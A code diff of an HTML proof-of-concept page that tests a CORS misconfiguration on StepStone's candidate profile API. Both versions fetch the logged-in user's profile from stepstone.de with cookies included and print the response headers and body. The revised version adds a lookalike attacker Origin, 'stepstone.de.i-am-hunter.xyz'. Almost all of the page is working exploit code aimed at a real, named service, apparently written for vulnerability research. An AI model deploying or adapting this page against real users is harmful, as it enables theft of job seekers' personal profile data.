@@ -1,50 +1,36 @@
-<!doctype html>
-<html>
+<!DOCTYPE html>
+<html lang="en">
 <head>
-  <meta charset="utf-8" />
-  <title>StepStone CORS PoC — Controlled Domain</title>
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <style>
-    body { font-family: system-ui, -apple-system, Arial; padding: 18px; }
-    pre { white-space: pre-wrap; word-break: break-word; max-height: 60vh; overflow:auto; background:#f6f7f9; padding:12px; border-radius:6px;}
-    .ok { color: darkgreen; }
-    .bad { color: darkred; }
-  </style>
+<meta charset="UTF-8">
+<title>StepStone CORS PoC</title>
 </head>
 <body>
-  <h1>StepStone CORS PoC</h1>
-  <p>This page demonstrates cross-origin fetch from a controlled domain. Only run while authenticated to your StepStone account (use your test account).</p>
-  <button id="run">Run fetch</button>
-  <div id="results"></div>
-  <pre id="output">No attempt yet.</pre>
+<h1>StepStone CORS PoC</h1>
+<button id="run">Run PoC</button>
+<pre id="output"></pre>
 
-  <script>
-    const out = text => { document.getElementById('output').textContent = text; console.log(text); }
-    async function run() {
-      out('Attempting fetch to https://www.stepstone.de/candidate/profile/editor/api/v1/profile ...');
-      try {
-        const res = await fetch('https://www.stepstone.de/candidate/profile/editor/api/v1/profile', {
-          method: 'GET',
-          credentials: 'include', // send cookies
-          mode: 'cors' // allow CORS behavior
+<script>
+document.getElementById("run").onclick = async () => {
+    try {
+        const response = await fetch('https://www.stepstone.de/candidate/profile/editor/api/v1/profile', {
+            method: 'GET',
+            credentials: 'include',
+            headers: {
+                'Origin': 'https://www.stepstone.de.i-am-hunter.xyz'
+            }
         });
-        // log response headers
-        const aco = res.headers.get('Access-Control-Allow-Origin');
-        const acc = res.headers.get('Access-Control-Allow-Credentials');
-        out(`Response status: ${res.status}\nAccess-Control-Allow-Origin: ${aco}\nAccess-Control-Allow-Credentials: ${acc}\n\nAttempting to parse JSON (if readable) ...`);
-        // try to read JSON (will fail if CORS blocks)
-        const text = await res.text();
-        try {
-          const json = JSON.parse(text);
-          out('✅ JSON received:\n' + JSON.stringify(json, null, 2));
-        } catch (e) {
-          out('⚠️ Response body received but not JSON-parsed (possibly blocked).\nRaw body:\n' + text.slice(0,5000));
-        }
-      } catch (err) {
-        out('Fetch error: ' + String(err));
-      }
+        const data = await response.json();
+        document.getElementById("output").textContent =
+            JSON.stringify({
+                status: response.status,
+                origin: response.headers.get('Access-Control-Allow-Origin'),
+                credentials: response.headers.get('Access-Control-Allow-Credentials'),
+                data: data
+            }, null, 2);
+    } catch (err) {
+        document.getElementById("output").textContent = 'Error: ' + err;
     }
-    document.getElementById('run').addEventListener('click', run);
-  </script>
+};
+</script>
 </body>
 </html>
